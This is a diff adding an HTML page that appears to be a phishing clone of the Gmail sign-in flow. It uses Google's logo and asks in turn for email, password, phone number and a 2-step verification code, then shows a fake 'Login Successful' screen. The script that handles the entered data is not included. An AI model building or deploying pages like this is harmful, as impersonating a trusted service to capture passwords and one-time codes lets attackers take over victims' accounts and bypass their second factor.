@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Gmail Sign In</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="login-card" id="login-card">
+        <!-- Email Step -->
+        <div class="login-step" id="email-step">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+              alt="Google"
+            />
+          </div>
+          <h1>Sign in</h1>
+          <p class="subtitle">to continue to Gmail</p>
+
+          <div class="form-group">
+            <label for="email">Email or phone</label>
+            <input type="email" id="email" name="email" required />
+          </div>
+
+          <div class="links">
+            <a href="#">Forgot email?</a>
+          </div>
+
+          <div class="guest-mode">
+            <p>Not your computer? Use Guest mode to sign in privately.</p>
+            <a href="#">Learn more about using Guest mode</a>
+          </div>
+
+          <div class="button-container">
+            <a href="#" class="create-account">Create account</a>
+            <button id="email-next" class="next-button">Next</button>
+          </div>
+        </div>
+
+        <!-- Password Step -->
+        <div class="login-step hidden" id="password-step">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+              alt="Google"
+            />
+          </div>
+          <h1>Welcome</h1>
+          <div class="user-identifier">
+            <span id="user-email"></span>
+            <a href="#" id="back-to-email" class="change-user">⮜</a>
+          </div>
+
+          <div class="form-group">
+            <label for="password">Enter your password</label>
+            <input type="password" id="password" name="password" required />
+          </div>
+
+          <div class="links">
+            <a href="#">Forgot password?</a>
+          </div>
+
+          <div class="button-container">
+            <button id="password-next" class="next-button">Next</button>
+          </div>
+        </div>
+
+        <!-- Verification Method Selection Step -->
+        <div class="login-step hidden" id="verification-method-step">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+              alt="Google"
+            />
+          </div>
+          <h1>2-Step Verification</h1>
+          <p class="subtitle">Choose your verification method</p>
+
+          <div class="verification-methods">
+            <div class="verification-method" id="phone-method">
+              <div class="method-icon">📱</div>
+              <div class="method-details">
+                <h3>Text message (SMS)</h3>
+                <p>Google will send a verification code to your phone</p>
+              </div>
+            </div>
+
+            <div class="verification-method" id="authenticator-method">
+              <div class="method-icon">🔐</div>
+              <div class="method-details">
+                <h3>Google Authenticator</h3>
+                <p>
+                  Use the Google Authenticator app to get verification codes
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div class="button-container">
+            <button id="back-to-password" class="back-button">Back</button>
+          </div>
+        </div>
+
+        <!-- Phone Number Input Step -->
+        <div class="login-step hidden" id="phone-input-step">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+              alt="Google"
+            />
+          </div>
+          <h1>Verify your phone</h1>
+          <p class="subtitle">
+            Enter your phone number to receive a verification code
+          </p>
+
+          <div class="form-group">
+            <label for="phone-number">Phone number</label>
+            <input
+              type="tel"
+              id="phone-number"
+              name="phone-number"
+              placeholder="+1 (555) 555-5555"
+              required
+            />
+          </div>
+
+          <div class="button-container">
+            <button id="back-to-verification-methods" class="back-button">
+              Back
+            </button>
+            <button id="phone-next" class="next-button">Send Code</button>
+          </div>
+        </div>
+
+        <!-- Verification Step -->
+        <div class="login-step hidden" id="verification-step">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+              alt="Google"
+            />
+          </div>
+          <h1>2-Step Verification</h1>
+          <div id="phone-verification-info">
+            <p class="subtitle">
+              A verification code was sent to your phone number
+            </p>
+            <p class="phone-number" id="user-phone">+1 (***) ***-**67</p>
+          </div>
+          <div id="authenticator-verification-info" class="hidden">
+            <p class="subtitle">
+              Enter the 6-digit verification code from your Google Authenticator
+              app
+            </p>
+          </div>
+
+          <div class="form-group">
+            <label for="verification-code">Enter the verification code</label>
+            <input
+              type="text"
+              id="verification-code"
+              name="verification-code"
+              maxlength="6"
+              required
+            />
+          </div>
+
+          <div class="links">
+            <a href="#" id="verification-help-link">Didn't receive a code?</a>
+          </div>
+
+          <div class="button-container">
+            <button id="back-button" class="back-button">Back</button>
+            <button id="verification-next" class="next-button">Verify</button>
+          </div>
+        </div>
+
+        <!-- Success Step -->
+        <div class="login-step hidden" id="success-step">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+              alt="Google"
+            />
+          </div>
+          <div class="success-message">
+            <div class="checkmark">✓</div>
+            <h1>Login Successful</h1>
+            <p>You are now signed in to your Gmail account.</p>
+          </div>
+
+          <div class="button-container">
+            <button id="continue-to-gmail" class="next-button">
+              Continue to Gmail
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Loading Screen -->
+      <div class="loading-screen hidden" id="loading-screen">
+        <div class="loading-content">
+          <div class="logo">
+            <img
+              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+              alt="Google"
+            />
+          </div>
+          <div class="loading-spinner">
+            <div class="spinner"></div>
+          </div>
+          <p class="loading-text" id="loading-text">Signing you in...</p>
+        </div>
+      </div>
+
+      <div class="footer">
+        <div class="language-selector">
+          <select id="language">
+            <option value="en">English (United States)</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+          </select>
+        </div>
+        <div class="footer-links">
+          <a href="#">Help</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+        </div>
+      </div>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
+</html>
